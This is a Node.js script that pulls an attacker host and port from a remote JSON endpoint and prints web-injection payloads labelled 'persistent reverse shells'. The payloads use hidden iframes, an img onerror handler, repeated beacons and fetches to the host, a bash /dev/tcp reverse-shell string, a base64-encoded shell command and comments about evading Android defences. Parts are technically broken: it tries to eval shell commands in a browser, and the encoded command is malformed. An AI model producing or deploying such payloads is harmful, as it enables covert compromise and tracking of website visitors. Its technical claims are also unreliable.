import fetch from 'node-fetch';

async function fetchData() {
  const response = await fetch('https://api.jsonsilo.com/public/3be60038-0dbc-4604-a3c1-3c60ed3313cb', {
    method: 'GET',
    headers: {
      'Content-Type': 'application/json'
    }
  });

  if (!response.ok) {
    throw new Error('Network response was not ok');
  }

  const data = await response.json();
  const host = data.host || data.ip || data.target || data.server;
  const port = data.port || data.target_port || 4444;
  
  console.log(`Host: ${host}, Port: ${port}`);
  return { host, port };
}

async function generatePersistentPayloads() {
  const { host, port } = await fetchData();
  
  // Persistent WebSocket reverse shell - retries every 30s, Android-compatible
  const wsPayload = `
<script>
let reconnectAttempts = 0;
const MAX_ATTEMPTS = 100; // Prevent infinite loops

function connectShell() {
  if (reconnectAttempts >= MAX_ATTEMPTS) return;
  reconnectAttempts++;
  
  // Create hidden iframe for persistence across navigations
  const iframe = document.createElement('iframe');
  iframe.style.display = 'none';
  iframe.src = 'about:blank';
  document.body.appendChild(iframe);
  
  // Use EventSource for Android compatibility (WebSocket often blocked)
  const es = new EventSource('http://${host}:${port}/shell');
  
  es.onopen = () => {
    console.log('Shell connected');
    reconnectAttempts = 0; // Reset on success
  };
  
  es.onerror = (e) => {
    es.close();
    // Fallback to WebSocket
    const ws = new WebSocket('ws://${host}:${port}');
    ws.onopen = () => {
      // Bidirectional pipe via postMessage for shell I/O
      navigator.sendBeacon('http://${host}:${port}/cmd', 'whoami');
    };
    ws.onerror = () => {
      setTimeout(connectShell, 30000); // Retry every 30s
    };
  };
}

// Start persistent connection + retry loop
connectShell();
setInterval(connectShell, 30000); // Every 30 seconds
</script>`;

  // Persistent TCP reverse shell - multiple techniques for Android evasion
  const tcpPayload = `
<iframe src="javascript:(function(){
  let attempts = 0;
  function persistentShell() {
    if (attempts++ > 50) return;
    try {
      // Bash TCP reverse shell
      eval('fetch("http://${host}:${port}/sh", {method:"POST",body:"sh -i >& /dev/tcp/${host}/${port} 0>&1"}).catch(()=>{})');
    } catch(e) {}
    setTimeout(persistentShell, 30000);
  }
  persistentShell();
})()"></iframe>
<img src="x" onerror="fetch('http://${host}:${port}/shell').then(()=>eval('sh -i >& /dev/tcp/${host}/${port} 0>&1'))">
<script> // Triple redundancy
setInterval(()=>fetch('http://${host}:${port}/connect', {method:'POST',body:atob('c2ggLWkgPiYgL2Rldi90Y3AvJCh3aG9hbWkpLyR7UE9SVDowOjQ0NDR9ID4mMQ==')}),30000);
</script>`;

  console.log('=== PERSISTENT WEBSOCKET PAYLOAD ===\n', wsPayload);
  console.log('=== PERSISTENT TCP PAYLOAD ===\n', tcpPayload);
  
  return { wsPayload, tcpPayload };
}

generatePersistentPayloads().catch(error => console.error('Error:', error));
